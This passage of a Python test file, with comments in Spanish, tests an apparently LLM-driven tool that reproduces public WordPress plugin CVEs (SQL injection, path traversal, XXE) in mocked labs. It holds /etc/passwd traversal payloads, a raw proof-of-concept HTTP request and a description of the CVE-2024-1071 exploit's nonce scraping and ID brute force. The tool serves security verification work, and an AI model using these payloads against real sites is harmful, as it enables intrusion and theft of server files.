    # w2dc_level_filter) confirmo la inyeccion, y el informe final no daba ninguna pista de que
    # estaba devolviendo el servidor de verdad -- exactamente el mismo problema que ya se habia
    # arreglado para path-traversal. Ahora el cuerpo real de la respuesta de CONTROL (sin
    # inyeccion) va en la evidencia, y cada intento error-based/boolean-blind lleva su propio
    # recorte, para poder diagnosticar un negativo sin tener que relanzar el ataque a mano.
    import binoracle.workflows.wpverify as wpverify

    class _FakeLab:
        def write_canary(self, path, secret):
            return True

    class _FakeSession:
        def request(self, method, url, **kw):
            class _R:
                status_code = 200
                text = '{"status":"ok","listings":[]}'
            return _R()

    fake_boot = wpverify._LabSession(
        lab=_FakeLab(), base_url="http://lab.invalid", admin_id="1", admin_user="a",
        admin_pass="b", sub_user="s", sub_pass="p", sub_sess=_FakeSession(), admin_sess=None,
        shots=[], capture=lambda *a, **k: None)
    monkeypatch.setattr(wpverify, "_bootstrap_lab", lambda *a, **kw: fake_boot)
    monkeypatch.setattr(wpverify, "_check_prereqs", lambda *a, **k: None)
    # el time-based blind mide retrasos reales con time.time(); como el fake nunca tarda, no hay
    # necesidad de mockear time.sleep -- solo evitamos que el bucle real de 7 pares se demore de
    # verdad frenando el test (el fake responde al instante, asi que no hace falta nada mas).

    res = wpverify.verify_wordpress_sqli(
        "/tmp/fake", "some-plugin", "/", "GET", {"w2dc_level_filter": "1"},
        sqli_param_hint="w2dc_level_filter")

    assert res.verified is False
    assert "la inyeccion SQL no se confirmo" in res.detail
    assert res.evidence.get("respuesta_control_recorte") == '{"status":"ok","listings":[]}'
    assert "Respuesta real de la peticion de control" in res.detail
    assert all("respuesta_cuerpo_recorte" in t for t in res.evidence["error_based_intentos"])


def test_verify_wordpress_sqli_enables_debug_display_only_after_login(monkeypatch):
    # bug real encontrado en vivo, CVE-2024-1071 (Ultimate Member), en una demo real: activar
    # WP_DEBUG_DISPLAY=true DESDE _bootstrap_lab (antes del login del admin/subscriber) hacia
    # que un aviso de PHP totalmente ajeno a la inyeccion (el propio plugin cargando su dominio
    # de traduccion demasiado pronto) se imprimiera ANTES de que WordPress pudiera mandar la
    # cabecera Set-Cookie -- login sin cookie de sesion, verificacion bloqueada antes de
    # intentar nada de la SQLi real. verify_wordpress_sqli ahora activa WP_DEBUG_DISPLAY con un
    # wp_cli PROPIO, DESPUES de que _bootstrap_lab ya haya devuelto una sesion (login hecho) --
    # nunca a traves del parametro wp_debug_display de _bootstrap_lab.
    import binoracle.workflows.wpverify as wpverify

    calls = []

    class _FakeLabForWpCli:
        def wp_cli(self, *args, **kw):
            calls.append(("lab.wp_cli",) + args)
            class _R:
                returncode = 0
                stdout = ""
                stderr = ""
            return _R()

        def teardown(self):
            calls.append(("lab.teardown",))

    class _FakeSession:
        def request(self, method, url, **kw):
            calls.append(("request", url))
            class _R:
                status_code = 200
                text = '{"status":"ok"}'
            return _R()

    fake_boot = wpverify._LabSession(
        lab=_FakeLabForWpCli(), base_url="http://lab.invalid", admin_id="1", admin_user="a",
        admin_pass="b", sub_user="s", sub_pass="p", sub_sess=_FakeSession(), admin_sess=None,
        shots=[], capture=lambda *a, **k: None)

    bootstrap_calls = []
    def fake_bootstrap(lab, *a, **kw):
        bootstrap_calls.append(kw)
        # _bootstrap_lab NUNCA debe recibir wp_debug_display=True para SQLi -- eso rompia el
        # login de ESE mismo bootstrap antes de que terminara.
        assert kw.get("wp_debug_display") is not True
        return fake_boot
    monkeypatch.setattr(wpverify, "_bootstrap_lab", fake_bootstrap)
    monkeypatch.setattr(wpverify, "_check_prereqs", lambda *a, **k: None)
    monkeypatch.setattr(wpverify, "_Lab", lambda *a, **kw: _FakeLabForWpCli())

    wpverify.verify_wordpress_sqli(
        "/tmp/fake", "some-plugin", "/wp-admin/admin-ajax.php?action=x", "GET",
        {"sorting": "1"}, sqli_param_hint="sorting")

    wp_cli_calls = [c for c in calls if c[0] == "lab.wp_cli"]
    display_calls = [c for c in wp_cli_calls
                     if c[1:4] == ("config", "set", "WP_DEBUG_DISPLAY")]
    assert display_calls, "verify_wordpress_sqli debe activar WP_DEBUG_DISPLAY el mismo"
    assert display_calls[0][4] == "true"
    # el orden real importa: la activacion debe ir DESPUES de que _bootstrap_lab (que incluye
    # el login) ya haya devuelto, nunca antes -- confirmado porque bootstrap_calls ya se registro
    # antes de que display_calls exista en absoluto (ambas listas se llenan en orden real de
    # ejecucion dentro de la misma llamada).
    assert bootstrap_calls, "_bootstrap_lab debe haberse llamado"


def test_verify_wordpress_sqli_resolves_unresolved_endpoint_placeholders(monkeypatch):
    # bug real confirmado en vivo, CVE-2024-1071: el exploit publico (gbrsh/CVE-2024-1071) trae
    # el endpoint como PLANTILLA ('nonce={nonce}&directory_id={dir_id}'), y sin resolverlos
    # binoracle mandaba el string literal '{nonce}' -- el servidor rechazaba SIEMPRE con 'Wrong
    # Nonce', un bloqueo de infraestructura (no evidencia real de que la inyeccion no exista).
    # verify_wordpress_sqli debe raspar un nonce/id REAL de una pagina viva antes de atacar.
    import binoracle.workflows.wpverify as wpverify

    requested_urls = []

    class _FakeResp:
        def __init__(self, text="", status_code=200):
            self.text = text
            self.status_code = status_code

    class _FakeSubSess:
        def get(self, url, **kw):
            requested_urls.append(("GET", url))
            return _FakeResp(
                text='<script>var UM_vars = {"nonce":"a1b2c3d4e5","directory_id":42};</script>')

        def request(self, method, url, **kw):
            requested_urls.append((method, url))
            return _FakeResp(text='{"success":true,"data":[]}')

    fake_boot = wpverify._LabSession(
        lab=None, base_url="http://lab.invalid", admin_id="1", admin_user="a", admin_pass="b",
        sub_user="s", sub_pass="p", sub_sess=_FakeSubSess(), admin_sess=None, shots=[],
        capture=lambda *a, **k: None)

    monkeypatch.setattr(wpverify, "_bootstrap_lab", lambda *a, **kw: fake_boot)
    monkeypatch.setattr(wpverify, "_check_prereqs", lambda *a, **k: None)

    class _FakeLab:
        def wp_cli(self, *a, **kw):
            class _R:
                returncode = 0
                stdout = ""
                stderr = ""
            return _R()

        def teardown(self):
            pass

    monkeypatch.setattr(wpverify, "_Lab", lambda *a, **kw: _FakeLab())

    res = wpverify.verify_wordpress_sqli(
        "/tmp/fake", "some-plugin",
        "/wp-admin/admin-ajax.php?action=um_get_members&nonce={nonce}&directory_id={dir_id}",
        "GET", {"sorting": "1"}, sqli_param_hint="sorting")

    attack_urls = [u for m, u in requested_urls if "admin-ajax.php" in u]
    assert attack_urls, "debia atacar el endpoint real, no quedarse sin peticiones"
    assert all("{nonce}" not in u and "{dir_id}" not in u for u in attack_urls), (
        "el placeholder literal nunca debe llegar a la peticion real")
    assert all("nonce=a1b2c3d4e5" in u for u in attack_urls)
    assert all("directory_id=42" in u for u in attack_urls)
    assert res.evidence.get("placeholders_resueltos") == {"nonce": "a1b2c3d4e5", "dir_id": "42"}


def test_verify_wordpress_sqli_resolves_nonce_given_as_a_loose_parameter(monkeypatch):
    # bug real confirmado en vivo, CVE-2024-1071: en otra corrida del MISMO CVE, el LLM extrajo
    # el nonce no como placeholder en la URL sino como un parametro suelto mas
    # (parameters=['nonce', 'directory_id']) -- sin resolverlo, base_params lo rellenaba con "1"
    # (el valor por defecto de cualquier parametro sin dict), y el servidor rechazaba SIEMPRE con
    # 'Wrong Nonce'. verify_wordpress_sqli debe reconocer CUALQUIER parametro con pinta de nonce/
    # token (no solo el que viene como placeholder en la URL) y sustituirlo por un valor real,
    # SIN tocar el parametro realmente inyectable (directory_id, elegido por _pick_param).
    import binoracle.workflows.wpverify as wpverify

    requested_urls = []

    class _FakeResp:
        def __init__(self, text="", status_code=200):
            self.text = text
            self.status_code = status_code

    class _FakeSubSess:
        def get(self, url, **kw):
            requested_urls.append(("GET", url))
            return _FakeResp(text='<script>var x = {"nonce":"deadbeef01"};</script>')

        def request(self, method, url, **kw):
            requested_urls.append((method, url, kw.get("params") or kw.get("data")))
            return _FakeResp(text='{"success":true,"data":[]}')

    fake_boot = wpverify._LabSession(
        lab=None, base_url="http://lab.invalid", admin_id="1", admin_user="a", admin_pass="b",
        sub_user="s", sub_pass="p", sub_sess=_FakeSubSess(), admin_sess=None, shots=[],
        capture=lambda *a, **k: None)

    monkeypatch.setattr(wpverify, "_bootstrap_lab", lambda *a, **kw: fake_boot)
    monkeypatch.setattr(wpverify, "_check_prereqs", lambda *a, **k: None)

    class _FakeLab:
        def wp_cli(self, *a, **kw):
            class _R:
                returncode = 0
                stdout = ""
                stderr = ""
            return _R()

        def teardown(self):
            pass

    monkeypatch.setattr(wpverify, "_Lab", lambda *a, **kw: _FakeLab())

    res = wpverify.verify_wordpress_sqli(
        "/tmp/fake", "some-plugin", "/wp-admin/admin-ajax.php?action=um_get_members", "GET",
        ["nonce", "directory_id"], sqli_param_hint="directory_id")

    attack_calls = [c for c in requested_urls if len(c) == 3]
    assert attack_calls, "debia atacar de verdad"
    for _, _, payload in attack_calls:
        assert payload.get("nonce") == "deadbeef01", (
            "el nonce debe sustituirse por el valor real raspado, nunca quedarse en '1'")
    assert res.evidence.get("parametros_resueltos_con_valor_real") == {"nonce": "deadbeef01"}


def test_verify_wordpress_sqli_matches_real_published_exploit_scraping_and_id_bruteforce(monkeypatch):
    # reproduce de verdad el exploit publico pegado por el usuario (gbrsh/secragon,
    # CVE-2024-1071, github.com/gbrsh/CVE-2024-1071): 1) el nonce NO esta en la portada por
    # defecto, SOLO en '/index.php/register/' (una pagina que Ultimate Member crea al activarse,
    # no la portada generica) -- hay que enumerar las paginas reales del sitio, no asumir '/'. 2)
    # 'directory_id' no es un numero cualquiera sino hashlib.md5(str(n))[10:15] para un n pequeno,
    # exactamente lo que el exploit real prueba por fuerza bruta (n=1..100) hasta que el servidor
    # acepta. Sin ambos resueltos, el servidor nunca deja pasar la peticion al query vulnerable.
    import hashlib
    import binoracle.workflows.wpverify as wpverify

    REAL_NONCE = "abc12345de"
    REAL_N = 7
    REAL_DIR_ID = hashlib.md5(str(REAL_N).encode()).hexdigest()[10:15]
    PAGE_URL = "http://lab.invalid/index.php/register/"

    requested = []

    class _FakeResp:
        def __init__(self, text="", status_code=200):
            self.text = text
            self.status_code = status_code

    class _FakeSubSess:
        def get(self, url, **kw):
            requested.append(("GET", url))
            if url == PAGE_URL:
                return _FakeResp(
                    text=f'<script>var um_scripts = {{"nonce":"{REAL_NONCE}"}};</script>')
            return _FakeResp(text="<html>portada generica, nada del plugin aqui</html>")

        def request(self, method, url, **kw):
            from urllib.parse import urlparse, parse_qs
            # nonce/directory_id van EMBEBIDOS en la query string de la URL (vienen del propio
            # endpoint, '...&nonce=xxx&directory_id=yyy'), no en el body -- igual que la peticion
            # real que construye verify_wordpress_sqli a partir del endpoint ya resuelto.
            qs = {k: v[0] for k, v in parse_qs(urlparse(url).query).items()}
            payload = {**qs, **dict(kw.get("data") or kw.get("params") or {})}
            requested.append(("REQ", url, payload))
            if payload.get("nonce") != REAL_NONCE:
                return _FakeResp(text='{"success":false,"data":"Wrong Nonce"}')
            if payload.get("directory_id") != REAL_DIR_ID:
                return _FakeResp(text='{"success":false,"data":"Invalid directory"}')
            return _FakeResp(text='{"success":true,"data":[]}')

    fake_boot = wpverify._LabSession(
        lab=None, base_url="http://lab.invalid", admin_id="1", admin_user="a", admin_pass="b",
        sub_user="s", sub_pass="p", sub_sess=_FakeSubSess(), admin_sess=None, shots=[],
        capture=lambda *a, **k: None)

    monkeypatch.setattr(wpverify, "_bootstrap_lab", lambda *a, **kw: fake_boot)
    monkeypatch.setattr(wpverify, "_check_prereqs", lambda *a, **k: None)

    class _FakeLab:
        def wp_cli(self, *args, **kw):
            class _R:
                returncode = 0
                stdout = ""
                stderr = ""
            r = _R()
            if args[:2] == ("post", "list"):
                r.stdout = PAGE_URL + "\n"
            return r

        def teardown(self):
            pass

    monkeypatch.setattr(wpverify, "_Lab", lambda *a, **kw: _FakeLab())

    res = wpverify.verify_wordpress_sqli(
        "/tmp/fake", "some-plugin",
        "/wp-admin/admin-ajax.php?action=um_get_members&nonce={nonce}&directory_id={dir_id}",
        "POST", {"sorting": "1"}, sqli_param_hint="sorting")

    attack_calls = [c for c in requested if c[0] == "REQ"]
    assert attack_calls, "debia llegar a atacar de verdad, no quedarse bloqueado"
    assert any(p.get("nonce") == REAL_NONCE and p.get("directory_id") == REAL_DIR_ID
              for _, _, p in attack_calls), (
        "al menos la peticion final debe llevar el nonce real Y el directory_id real juntos")
    assert res.evidence.get("placeholders_resueltos", {}).get("nonce") == REAL_NONCE
    assert res.evidence.get("placeholders_resueltos", {}).get("dir_id") == REAL_DIR_ID


def test_verify_wordpress_sqli_attacks_shortcode_page_instead_of_bare_root(monkeypatch):
    # bug real confirmado en vivo, CVE-2024-3552: atacar '/' no puede mostrar ninguna diferencia
    # visible aunque la inyeccion sea real, porque esa pagina no invoca nada del plugin. Cuando
    # _bootstrap_lab devuelve una pagina real creada con el shortcode (shortcode_page_path),
    # verify_wordpress_sqli debe atacar ESA ruta, no el endpoint original.
    import binoracle.workflows.wpverify as wpverify

    requested_urls = []

    class _FakeSession:
        def request(self, method, url, **kw):
            requested_urls.append(url)
            class _R:
                status_code = 200
                text = '{"status":"ok"}'
            return _R()

    fake_boot = wpverify._LabSession(
        lab=None, base_url="http://lab.invalid", admin_id="1", admin_user="a",
        admin_pass="b", sub_user="s", sub_pass="p", sub_sess=_FakeSession(), admin_sess=None,
        shots=[], capture=lambda *a, **k: None, shortcode_page_path="/?page_id=42")

    bootstrap_calls = []

    def fake_bootstrap(*a, **kw):
        bootstrap_calls.append(kw)
        return fake_boot

    monkeypatch.setattr(wpverify, "_bootstrap_lab", fake_bootstrap)
    monkeypatch.setattr(wpverify, "_check_prereqs", lambda *a, **k: None)

    res = wpverify.verify_wordpress_sqli(
        "/tmp/fake", "some-plugin", "/", "GET", {"w2dc_level_filter": "1"},
        sqli_param_hint="w2dc_level_filter", shortcode_name="w2dc_search")

    assert bootstrap_calls[0]["shortcode_name"] == "w2dc_search"
    assert res.evidence.get("endpoint_shortcode_page") == "/?page_id=42"
    assert all(u.startswith("http://lab.invalid/?page_id=42") for u in requested_urls)


def test_verify_wordpress_sqli_does_not_request_shortcode_page_for_non_root_endpoint(monkeypatch):
    # si el analista ya dio un endpoint concreto (no la raiz), no hay que crear ni usar ninguna
    # pagina de shortcode -- shortcode_name solo tiene sentido cuando el endpoint es '/'.
    import binoracle.workflows.wpverify as wpverify

    bootstrap_calls = []

    class _FakeSession:
        def request(self, method, url, **kw):
            class _R:
                status_code = 200
                text = '{"status":"ok"}'
            return _R()

    fake_boot = wpverify._LabSession(
        lab=None, base_url="http://lab.invalid", admin_id="1", admin_user="a",
        admin_pass="b", sub_user="s", sub_pass="p", sub_sess=_FakeSession(), admin_sess=None,
        shots=[], capture=lambda *a, **k: None, shortcode_page_path=None)

    def fake_bootstrap(*a, **kw):
        bootstrap_calls.append(kw)
        return fake_boot

    monkeypatch.setattr(wpverify, "_bootstrap_lab", fake_bootstrap)
    monkeypatch.setattr(wpverify, "_check_prereqs", lambda *a, **k: None)

    res = wpverify.verify_wordpress_sqli(
        "/tmp/fake", "some-plugin", "/wp-admin/admin-ajax.php?action=foo", "GET",
        {"w2dc_level_filter": "1"}, sqli_param_hint="w2dc_level_filter",
        shortcode_name="w2dc_search")

    assert bootstrap_calls[0]["shortcode_name"] is None
    assert "endpoint_shortcode_page" not in res.evidence
    assert all("respuesta_true_recorte" in t for t in res.evidence["boolean_intentos"])


def test_verify_wordpress_sqli_threads_relationship_table_only_for_bare_root(monkeypatch):
    # relationship_table solo tiene sentido junto con shortcode_name (no hay pagina a la que
    # enlazar la fila sin ella) -- debe pasarse a _bootstrap_lab cuando el endpoint es la raiz,
    # y nunca cuando el analista ya dio un endpoint concreto.
    import binoracle.workflows.wpverify as wpverify

    class _FakeSession:
        def request(self, method, url, **kw):
            class _R:
                status_code = 200
                text = '{"status":"ok"}'
            return _R()

    fake_boot = wpverify._LabSession(
        lab=None, base_url="http://lab.invalid", admin_id="1", admin_user="a",
        admin_pass="b", sub_user="s", sub_pass="p", sub_sess=_FakeSession(), admin_sess=None,
        shots=[], capture=lambda *a, **k: None, shortcode_page_path="/?page_id=6")

    bootstrap_calls = []

    def fake_bootstrap(*a, **kw):
        bootstrap_calls.append(kw)
        return fake_boot

    monkeypatch.setattr(wpverify, "_bootstrap_lab", fake_bootstrap)
    monkeypatch.setattr(wpverify, "_check_prereqs", lambda *a, **k: None)

    rel = {"wpdb_property": "w2dc_levels_relationships", "alias": "w2dc_lr",
          "join_column": "post_id"}

    wpverify.verify_wordpress_sqli(
        "/tmp/fake", "some-plugin", "/", "GET", {"w2dc_level_filter": "1"},
        sqli_param_hint="w2dc_level_filter", shortcode_name="w2dc_search",
        relationship_table=rel)
    assert bootstrap_calls[0]["relationship_table"] == rel

    bootstrap_calls.clear()
    wpverify.verify_wordpress_sqli(
        "/tmp/fake", "some-plugin", "/wp-admin/admin-ajax.php?action=foo", "GET",
        {"w2dc_level_filter": "1"}, sqli_param_hint="w2dc_level_filter",
        shortcode_name="w2dc_search", relationship_table=rel)
    assert bootstrap_calls[0]["relationship_table"] is None


def test_verify_wordpress_path_traversal_falls_back_to_etc_passwd(monkeypatch):
    # cuando el canario propio (en /tmp) no se confirma, se prueba tambien /etc/passwd literal --
    # el objetivo EXACTO del PoC publico ya divulgado. Si ESO si se confirma, el traversal es
    # real de todas formas; algo especifico del canario (no del endpoint) era el problema.
    import binoracle.workflows.wpverify as wpverify

    class _FakeLab:
        def write_canary(self, path, secret):
            return True

    class _FakeSession:
        def request(self, method, url, **kw):
            class _R:
                status_code = 200
                text = ""
            r = _R()
            payload = kw.get("data") or kw.get("params") or {}
            if payload.get("file[path]") == "/etc/passwd":
                r.text = "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1::/usr/sbin:/usr/sbin/nologin\n"
            return r

    fake_boot = wpverify._LabSession(
        lab=_FakeLab(), base_url="http://lab.invalid", admin_id="1", admin_user="a",
        admin_pass="b", sub_user="s", sub_pass="p", sub_sess=_FakeSession(), admin_sess=None,
        shots=[], capture=lambda *a, **k: None)
    monkeypatch.setattr(wpverify, "_bootstrap_lab", lambda *a, **kw: fake_boot)
    monkeypatch.setattr(wpverify, "_check_prereqs", lambda *a, **k: None)

    res = wpverify.verify_wordpress_path_traversal(
        "/tmp/fake", "some-plugin", "/wp-admin/admin-ajax.php?action=pc_added_uploaded_image",
        "POST", {"file[path]": "/etc/passwd"}, path_param_hint="file[path]")

    assert res.verified is True
    assert res.evidence.get("objetivo_ganador") == "/etc/passwd"
    assert res.evidence.get("payload_ganador") == "/etc/passwd"
    assert "root:x:0:0" in res.evidence.get("respuesta_cuerpo_recorte", "")
    assert "etc/passwd" in res.detail
    assert len(res.evidence.get("intentos_etc_passwd", [])) > 0


def test_verify_wordpress_xxe_follows_copy_then_serve_url(monkeypatch):
    # mismo patron "copia-y-sirve" aplicado a XXE: si la respuesta no trae el secreto directo
    # pero es JSON con una 'url' que apunta a donde quedo copiado/servido el fichero, se sigue esa
    # URL antes de rendirse.
    import json as _json
    import secrets as _real_secrets
    import binoracle.workflows.wpverify as wpverify

    class _FakeResp:
        def __init__(self, status_code, text):
            self.status_code = status_code
            self.text = text

    class _FakeLab:
        def write_canary(self, path, secret):
            return True

    class _FakeSession:
        def __init__(self):
            self.secret = None
        def request(self, method, url, **kw):
            if method == "GET" and url == "http://lab.invalid/leaked-xxe.txt":
                return _FakeResp(200, self.secret)
            return _FakeResp(200, _json.dumps({"url": "http://lab.invalid/leaked-xxe.txt",
                                               "status": "success"}))

    fake_sess = _FakeSession()
    fake_boot = wpverify._LabSession(
        lab=_FakeLab(), base_url="http://lab.invalid", admin_id="1", admin_user="a",
        admin_pass="b", sub_user="s", sub_pass="p", sub_sess=fake_sess, admin_sess=None,
        shots=[], capture=lambda *a, **k: None)
    monkeypatch.setattr(wpverify, "_bootstrap_lab", lambda *a, **kw: fake_boot)
    monkeypatch.setattr(wpverify, "_check_prereqs", lambda *a, **k: None)

    original_token_hex = _real_secrets.token_hex
    def fake_token_hex(n):
        s = original_token_hex(n)
        if n == 16:
            fake_sess.secret = s
        return s
    monkeypatch.setattr(wpverify.secrets, "token_hex", fake_token_hex)

    res = wpverify.verify_wordpress_xxe(
        "/tmp/fake", "some-plugin", "/wp-admin/admin-ajax.php?action=import_xml", "POST",
        {"xml": ""}, xml_param_hint="xml")

    assert res.verified is True
    assert res.evidence.get("url_seguida") == "http://lab.invalid/leaked-xxe.txt"


def test_research_and_poc_prompts_require_action_value_in_endpoint():
    # bug real confirmado en vivo (CVE-2024-50508): 'action' salia listado como un nombre de
    # parametro suelto sin su valor real, asi que admin-ajax.php nunca enrutaba la peticion a
    # ningun manejador -- las 40 variantes de traversal probadas no podian funcionar por mucho
    # que el payload fuera correcto. Los prompts que generan la hipotesis/extraen del PoC real
    # deben exigir que 'action' vaya en la URL del endpoint, no como parametro sin valor.
    from binoracle.workflows.cve_agent import _RESEARCH_SYS, _EXTRACT_POC_SYS
    for prompt in (_RESEARCH_SYS, _EXTRACT_POC_SYS):
        assert "action" in prompt
        assert "NUNCA dejes 'action' como" in prompt


def test_parse_raw_http_poc_request_extracts_real_values_including_action():
    # bug real confirmado en vivo (CVE-2024-50508): la extraccion via LLM reducia 'parameters' a
    # una lista de NOMBRES sin valores, perdiendo el valor REAL de 'action' (critico para que
    # WordPress enrute la peticion a algun manejador). El PoC real traia un bloque de peticion
    # HTTP cruda con los valores reales de TODOS los parametros -- parsearlo deterministicamente
    # evita depender de que el LLM lo transcriba bien.
    from binoracle.workflows.cve_agent import parse_raw_http_poc_request
    text = (
        "POC\n\n"
        "POST /wp-admin/admin-ajax.php HTTP/2\n"
        "Host: wp-dev.ddev.site\n"
        "Content-Type: application/x-www-form-urlencoded\n"
        "Content-Length: 53\n\n"
        "action=pc_added_uploaded_image&file[path]=/etc/passwd\n"
        '{\n  "path": "/var/www/html/wp-content/uploads/x.txt",\n  "status": "success"\n}\n')
    r = parse_raw_http_poc_request(text)
    assert r is not None
    assert r["method"] == "POST"
    assert r["path"] == "/wp-admin/admin-ajax.php"
    assert r["body_params"] == {"action": "pc_added_uploaded_image", "file[path]": "/etc/passwd"}
    assert r["headers"]["Host"] == "wp-dev.ddev.site"


def test_parse_raw_http_poc_request_handles_get_with_no_body():
    from binoracle.workflows.cve_agent import parse_raw_http_poc_request
    text = "GET /wp-content/plugins/foo/ajax.php?file=../../etc/passwd HTTP/1.1\nHost: target.local\n\n"
    r = parse_raw_http_poc_request(text)
    assert r["method"] == "GET"
    assert r["path"] == "/wp-content/plugins/foo/ajax.php?file=../../etc/passwd"
    assert r["body_params"] is None


def test_parse_raw_http_poc_request_does_not_misparse_json_body_as_form_params():
    from binoracle.workflows.cve_agent import parse_raw_http_poc_request
    text = 'POST /api/x HTTP/1.1\nHost: t\nContent-Type: application/json\n\n{"a": 1}\n'
    r = parse_raw_http_poc_request(text)
    assert r["method"] == "POST"
    assert r["body_params"] is None   # JSON, no form-urlencoded -- no se inventa nada


def test_parse_raw_http_poc_request_returns_none_without_a_request_block():
    from binoracle.workflows.cve_agent import parse_raw_http_poc_request
    assert parse_raw_http_poc_request("") is None
    assert parse_raw_http_poc_request(None) is None
    assert parse_raw_http_poc_request("just some prose, no http block here") is None
    assert parse_raw_http_poc_request("import requests\nrequests.post(url, data=payload)") is None


def test_investigate_cve_prefers_raw_poc_request_over_llm_extraction(monkeypatch):
    # end-to-end: cuando el PoC trae un bloque de peticion cruda, su endpoint/metodo/parametros
    # (con VALORES reales) deben ganar sobre lo que haya extraido la hipotesis del LLM o
    # _extract_hints_from_real_poc, no solo coexistir.
    import json as _json
    from binoracle.workflows import cve_agent, cvelookup, websource

    raw_poc_text = (
        "POST /wp-admin/admin-ajax.php HTTP/2\n"
        "Host: wp-dev.ddev.site\n"
        "Content-Type: application/x-www-form-urlencoded\n\n"
        "action=pc_added_uploaded_image&file[path]=/etc/passwd\n")

    def fake_fetch_cve(cve_id, timeout=20.0, enrich=True):
        ref = cvelookup.ExploitRef(url="https://github.com/RandomRobbieBF/CVE-2024-50508",
                                   source="github")
        return cvelookup.CVEInfo(
            cve_id=cve_id, ok=True,
            description="The Woo Product Design WordPress plugin before 1.0.1 ... Directory "
                        "Traversal.",
            has_public_exploit=True, exploit_refs=[ref])
    monkeypatch.setattr(cvelookup, "fetch_cve", fake_fetch_cve)
    monkeypatch.setattr(cve_agent, "fetch_public_poc_source", lambda refs, on_step=None: raw_poc_text)
    monkeypatch.setattr(websource, "fetch_source",
                        lambda *a, **kw: websource.SourceFetchResult(ok=False, note="not fetched"))

    class _FakeLLM:
        def available(self):
            return True
        def chat(self, messages, json_mode=True):
            # simula una hipotesis/extraccion peor: 'action' como nombre suelto, sin su valor
            return _json.dumps({
                "vuln_class": "path-traversal", "endpoint": "/wp-admin/admin-ajax.php",
                "http_method": "POST", "parameters": ["action", "file[path]"],
            })

    inv = cve_agent.investigate_cve("CVE-2024-50508", config=object(), llm=_FakeLLM(),
                                    on_step=lambda m: None, lang="es")

    assert inv.llm_notes.get("endpoint") == "/wp-admin/admin-ajax.php"
    assert inv.llm_notes.get("http_method") == "POST"
    assert inv.llm_notes.get("parameters") == {"action": "pc_added_uploaded_image",
                                               "file[path]": "/etc/passwd"}


def test_extract_known_ajax_action_from_parameters_dict():
    from binoracle.workflows.cve_agent import _extract_known_ajax_action
    assert _extract_known_ajax_action(
        {"parameters": {"action": "pc_added_uploaded_image", "file[path]": "/etc/passwd"}}
    ) == "pc_added_uploaded_image"


def test_extract_known_ajax_action_from_endpoint_query_string():
    from binoracle.workflows.cve_agent import _extract_known_ajax_action
    assert _extract_known_ajax_action(
        {"endpoint": "/wp-admin/admin-ajax.php?action=pc_added_uploaded_image"}
    ) == "pc_added_uploaded_image"


def test_extract_known_ajax_action_returns_none_when_unknown():
    from binoracle.workflows.cve_agent import _extract_known_ajax_action
    assert _extract_known_ajax_action({}) is None
    assert _extract_known_ajax_action({"parameters": ["action", "file[path]"]}) is None
    assert _extract_known_ajax_action({"endpoint": "/wp-admin/admin-ajax.php"}) is None


def test_investigate_cve_recovers_real_handler_when_llm_guess_does_not_ground(monkeypatch, tmp_path):
    # bug real en vivo, CVE-2024-50508: la hipotesis del LLM citaba 'vulnerable_functions':
    # ['handle_file_upload'], pero esa funcion no existe en el plugin real -- el grounding fallaba
    # y _deterministic_web_hints_from_source (que SI sabe leer add_action()) nunca llegaba a
    # ejecutarse. Ya conociamos el valor REAL de 'action' (del bloque HTTP crudo del PoC); hay que
    # usarlo para encontrar el callback real en vez de depender del nombre que el LLM adivino.
    import json as _json
    from binoracle.workflows import cve_agent, cvelookup, websource

    raw_poc_text = (
        "POST /wp-admin/admin-ajax.php HTTP/2\n"
        "Host: wp-dev.ddev.site\n"
        "Content-Type: application/x-www-form-urlencoded\n\n"
        "action=pc_added_uploaded_image&file[path]=/etc/passwd\n")

    plugin_dir = tmp_path / "woo-product-design"
    plugin_dir.mkdir()
    (plugin_dir / "plugin.php").write_text(
        "<?php\n"
        "add_action('wp_ajax_pc_added_uploaded_image', 'pc_handle_uploaded_image');\n"
        "function pc_handle_uploaded_image() { /* ... */ }\n"
    )

    def fake_fetch_cve(cve_id, timeout=20.0, enrich=True):
        ref = cvelookup.ExploitRef(url="https://github.com/RandomRobbieBF/CVE-2024-50508",
                                   source="github")
        return cvelookup.CVEInfo(
            cve_id=cve_id, ok=True,
            description="The Woo Product Design WordPress plugin before 1.0.1 ... Directory "
                        "Traversal.",
            has_public_exploit=True, exploit_refs=[ref])
    monkeypatch.setattr(cvelookup, "fetch_cve", fake_fetch_cve)
    monkeypatch.setattr(cve_agent, "fetch_public_poc_source", lambda refs, on_step=None: raw_poc_text)
    monkeypatch.setattr(
        websource, "fetch_source",
        lambda *a, **kw: websource.SourceFetchResult(
            ok=True, kind="wordpress-plugin", source="woo-product-design",
            resolved_version="1.0", local_path=str(plugin_dir), plugin_dir="woo-product-design"))

    class _FakeLLM:
        def available(self):
            return True
        def chat(self, messages, json_mode=True):
            return _json.dumps({
                "vuln_class": "path-traversal", "endpoint": "/wp-admin/admin-ajax.php",
                "http_method": "POST", "parameters": ["action", "file[path]"],
                "vulnerable_functions": ["handle_file_upload"],
            })

    inv = cve_agent.investigate_cve("CVE-2024-50508", config=object(), llm=_FakeLLM(),
                                    on_step=lambda m: None, lang="es")

    assert inv.source_grounding.get("found") == {
        "pc_handle_uploaded_image": ["plugin.php:2"]}


def test_attach_grounded_source_snippets_adds_real_code_as_blocker():
    # autonomia: cuando una verificacion dinamica se intenta pero no se confirma, el propio
    # informe debe traer el codigo REAL de la funcion ya grounded, sin que el analista tenga que
    # pedirmelo/bajarlo/grep-earlo a mano -- confirmado en vivo, CVE-2024-50508 (eso fue
    # exactamente lo que hizo falta hacer a mano para diagnosticar el negativo).
    from binoracle.workflows.cve_agent import Investigation, _attach_grounded_source_snippets
    import tempfile, os

    tmp = tempfile.mkdtemp()
    with open(os.path.join(tmp, "functions.php"), "w") as f:
        f.write("<?php\nfunction pc_added_uploaded_image(){\n    exit();\n}\n")

    inv = Investigation(cve_id="CVE-2099-0001")
    inv.source_fetch = {"local_path": tmp}
    inv.source_grounding = {"found": {"pc_added_uploaded_image": ["functions.php:2"]}}

    _attach_grounded_source_snippets(inv, es=True)

    assert any("pc_added_uploaded_image" in b and "```php" in b for b in inv.blockers)


def test_attach_grounded_source_snippets_noop_without_grounding_or_source():
    from binoracle.workflows.cve_agent import Investigation, _attach_grounded_source_snippets
    inv = Investigation(cve_id="CVE-2099-0002")
    _attach_grounded_source_snippets(inv, es=True)
    assert inv.blockers == []


def test_attach_grounded_source_snippets_surfaces_unrelated_sqli_sink(tmp_path):
    # autonomia real, confirmado en vivo CVE-2024-3552: la hipotesis citaba
